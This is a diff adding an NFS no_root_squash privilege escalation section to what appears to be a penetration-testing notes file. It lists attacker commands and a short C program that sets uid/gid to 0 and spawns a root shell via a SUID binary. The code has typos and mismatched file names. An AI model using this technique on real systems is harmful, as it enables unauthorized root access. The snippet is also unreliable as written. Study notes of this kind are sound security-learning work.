@@ -78,3 +78,25 @@ void main()
 
 
 ## NFS
+**Networld FIle System** escalation occurs when the system is misconfigured, allowing an attacker to connect their own file system to the victim's system. This can happen if NFS shares are improperly set up, particularly when options like **no_root_squash** are enabled.
+
+- Victim
+    - cat /etc/exports to find **no_root_squash**
+ 
+- Attacker
+    - showmount -e **IP_ADDRESS** | Shows mounted drives.
+    - mkdir **MOUNTED DRIVES**/attack
+
+**MOUNTED DRIVES**/attack/exploit.c
+```
+int main()
+{ setgid(0)
+  setuid(0)
+  system("/bin/bash");
+  return 0;
+}
+```
+    - gcc explot.c -o exploit -w
+    - chmod +s exploit
+    
+
